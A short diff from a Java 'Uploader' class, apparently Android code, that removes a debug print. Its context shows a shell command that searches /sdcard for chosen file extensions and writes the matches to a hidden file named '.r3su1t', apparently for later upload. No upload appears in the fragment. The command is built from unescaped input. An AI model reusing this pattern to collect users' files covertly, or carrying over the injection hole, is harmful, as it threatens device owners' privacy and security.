@@ -45,8 +45,6 @@ public class Uploader {
             if(i < extList.length - 1)ext += " -o -name *";
         }
 
-        System.out.print(ext);
-
         String[] cmds = {"sh", "-c", String.format("find /sdcard/ -name *%s > .r3su1t", ext)};//shell commands
         
         
